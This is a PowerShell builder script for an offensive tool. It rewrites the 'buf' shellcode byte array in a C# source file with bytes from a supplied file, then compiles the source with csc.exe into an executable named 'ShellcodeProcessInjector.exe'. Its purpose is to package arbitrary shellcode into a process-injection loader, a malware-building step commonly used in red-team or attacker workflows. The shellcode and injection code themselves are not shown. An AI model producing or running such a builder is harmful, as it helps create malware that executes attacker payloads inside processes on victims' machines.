param (
    [Parameter(Mandatory = $true)]
    [string]$CsFilePath,

    [Parameter(Mandatory = $true)]
    [string]$NewByteArrayFilePath
)

# STRING REPLACEMENT
# Read the .cs file
$csContent = Get-Content -Path $CsFilePath -Raw

# Read the new byte array from the text file
$newByteArray = Get-Content -Path $NewByteArrayFilePath -AsByteStream

# Convert the byte array to a string
$newString = [System.Text.Encoding]::Default.GetString($newByteArray)

# Search and replace the 'buf' byte array
$csContent = $csContent -replace '(byte\[\] buf = new byte\[)\d+\][^;]+;', $newString

# Save the modified .cs file
$csContent | Set-Content -Path $CsFilePath

Write-Host "Contents of $CsFilePath updated successfully."

# COMPILATION
# Locate the csc.exe binary
#$targetDirectory = "C:\\Windows\\Microsoft.NET"
$targetDirectory = "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\Roslyn"

try {
    $filesInDirectory = Get-ChildItem -Path $targetDirectory -File -Recurse -Filter csc.exe
    Write-Host "Found files in ${targetDirectory}:"
    $cscExePath = $filesInDirectory | ForEach-Object { $_.FullName }
    if ($cscExePath.Count -gt 1) {
        if ($cscExePath[0] -like "*Framework64*") {
            $cscPath64 = $cscExePath[0]
            $cscPath32 = $cscExePath[1]
        }
        else {
            $cscPath64 = $cscExePath[1]
            $cscPath32 = $cscExePath[0]
        }
    }
    else {
        $cscPath64 = $cscExePath
    }
}
catch {
    Write-Host "Error: Unable to retrieve files from $targetDirectory."
    Write-Host "Error: csc.exe not found. Make sure .NET Framework is installed."
    exit 1
}

# Compile the program.cs file
try {
    $outputExe = "ShellcodeProcessInjector.exe"
    & $cscPath64 /langversion:latest /target:exe /out:$outputExe $CsFilePath
    Write-Host "Compilation successful. Output saved as $outputExe"
}
catch {
    Write-Host "Error: Compilation failed. Check your source file and try again."
    exit 1
}